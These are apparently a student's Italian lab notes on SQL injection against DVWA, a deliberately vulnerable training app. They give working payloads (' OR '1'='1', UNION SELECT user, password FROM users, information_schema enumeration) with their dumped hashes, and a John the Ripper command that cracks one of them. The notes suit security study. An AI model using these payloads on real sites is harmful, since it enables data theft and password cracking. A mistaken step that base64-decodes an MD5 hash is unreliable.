
# Traccia 1

sudo ifconfig eth0 192.168.13.100 netmask 255.255.255.0
sudo ip route add default via 192.168.13.1
sudo nano /etc/network/interfaces

metto in low la sicurezza della macchina

vado nella sezione SQL injection e scrivo: ' OR '1'='1' -- -

    ID: ' OR '1'='1' -- -
    First name: admin
    Surname: admin

    ID: ' OR '1'='1' -- -
    First name: Gordon
    Surname: Brown

    ID: ' OR '1'='1' -- -
    First name: Hack
    Surname: Me

    ID: ' OR '1'='1' -- -
    First name: Pablo
    Surname: Picasso

    ID: ' OR '1'='1' -- -
    First name: Bob
    Surname: Smith


' OR '1'='1' UNION SELECT user, password FROM users

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: admin
    Password: admin

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: Gordon
    Password: Brown

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: Hack
    Password: Me

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: Pablo
    Password: Picasso

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: Bob
    Password: Smith

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: admin
    Password: 5f4dcc3b5aa765d61d8327deb882cf99

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: gordonb
    Password: e99a18c428cb38d5f260853678922e03

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: 1337
    Password: 8d3533d75ae2c3966d7e0d4fcc69216b

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: pablo
    Password: 0d107d09f5bbe40cade3de5c71e9e9b7

    ID: ' OR '1'='1' UNION SELECT user, password FROM users#
    User: smithy
    Password: 5f4dcc3b5aa765d61d8327deb882cf99

    echo "0d107d09f5bbe40cade3de5c71e9e9b7" | base64 -d

vedo la password a cosa corrisponde con jhon

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt

    Using default input encoding: UTF-8
    Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Press 'q' or Ctrl-C to abort, almost any other key for status
    letmein          (?)     
    1g 0:00:00:00 DONE (2026-07-27 12:07) 14.28g/s 10971p/s 10971c/s 10971C/s jeffrey..james1
    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
    Session completed. 


porto livello a medium

SQL injections = 1 UNION SELECT user, password FROM users#

    ID: 1 UNION SELECT user, password FROM users#
    First name: admin
    Surname: admin

    ID: 1 UNION SELECT user, password FROM users#
    First name: admin
    Surname: 5f4dcc3b5aa765d61d8327deb882cf99

    ID: 1 UNION SELECT user, password FROM users#
    First name: gordonb
    Surname: e99a18c428cb38d5f260853678922e03

    ID: 1 UNION SELECT user, password FROM users#
    First name: 1337
    Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

    ID: 1 UNION SELECT user, password FROM users#
    First name: pablo
    Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

    ID: 1 UNION SELECT user, password FROM users#
    First name: smithy
    Surname: 5f4dcc3b5aa765d61d8327deb882cf99

riporto a low per trovare i database

SQL -> 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: admin
    Surname: admin

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: columns_priv
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: db
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: func
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: help_category
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: help_keyword
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: help_relation
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: help_topic
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: host
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: proc
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: procs_priv
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: tables_priv
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: time_zone
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: time_zone_leap_second
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: time_zone_name
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: time_zone_transition
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: time_zone_transition_type
    Surname: 

    ID: 1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='mysql'-- -
    First name: user
    Surname: 